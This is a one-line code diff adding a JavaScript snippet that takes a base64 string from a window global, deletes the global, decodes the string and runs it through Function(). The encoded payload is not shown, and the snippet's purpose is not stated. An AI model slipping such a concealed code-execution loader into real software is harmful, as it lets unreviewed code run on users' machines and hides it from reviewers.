@@ -1,0 +1,1 @@
+(()=>{const encoded=window.__YK_INV_B64||'';delete window.__YK_INV_B64;if(!encoded)return;const raw=atob(encoded);const bytes=Uint8Array.from(raw,c=>c.charCodeAt(0));const code=new TextDecoder('utf-8').decode(bytes);Function(code)();})();
